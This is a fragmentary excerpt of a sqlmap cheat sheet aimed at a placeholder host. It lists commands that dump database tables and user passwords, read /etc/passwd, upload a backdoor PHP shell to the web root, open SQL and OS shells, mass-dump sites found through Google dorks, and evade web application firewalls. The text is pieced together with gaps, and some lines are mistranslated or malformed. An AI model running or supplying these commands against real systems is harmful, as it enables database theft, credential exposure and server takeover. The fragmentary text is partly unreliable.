...
```bash
sqlmap -u http://exploit.com/becomemember.php?id=14 --dbs
```

**Extract Tables from database**

```bash
sqlmap -u http://exploit.com/becomemember.php?id=14 -D database --tables
```

**Extract Columns of table_name from database**

```bash
sqlmap -u http://exploit.com/becomemember.php?id=14 -D database -T table_name --columns
```
...
```console
sqlmap -u http://exploit.com/books/view.php?id=100 --dbs --threads 5
```
...
```console
sqlmap -u http://exploit.com/books/view.php?id=100 --dbs --null-connection
```

__HTTP Persistant Connection__

```console
sqlmap -u http://exploit.com/books/view.php?id=100 --dbs --keep-alive
```

__Output prediction__

```console
sqlmap -u http://exploit.com/books/view.php?id=100 -D database -T user -c users,password --dump --predict-output
```
...
```console
sqlmap -u http://exploit.com/books/view.php?id=100 --privileges
```

__Reading Files from the server__
```console
sqlmap -u http://exploit.com/books/view.php?id=100 --file-read=/etc/passwd
```

__Uploading Files/Shell__
```console
sqlmap -u http://exploit.com/books/view.php?id=100 --file-write=/root/imxx/backdoor.php --file-dest=/var/www/imran.php
```
...
```console
sqlmap -u http://exploit.com/login.php?id=100 --sql-shell
```

__OS shell__
```console
sqlmap -u http://exploit.com/login.php?id=100 --os-shell
```

__Os Command Exe without Shell Upload__
```console
sqlmap -u http://exploit.com/login.php?id=100 --os-cmd "uname -a"
```
...
```console
sqlmap -u http://exploit.com/login.php -p user=admin&pass=admin
```

google search injection point automatically runs out all fields, you need to ensure that google.com can access normally

```bash
sqlmap -g "google syntax" --dump-all --batch
```

test specifies the type of injection\technology used
...
bypasses the WEB firewall (WAF) Sqlmap by encoding by default with char()
```bash
--tamper plugin directory \sqlmap-dev\tamper
```

smart Intelligent level execution test level

```bash
sqlmap -u "http:// www.2cto.com /news?id=1" --smart --level 3 --users
```
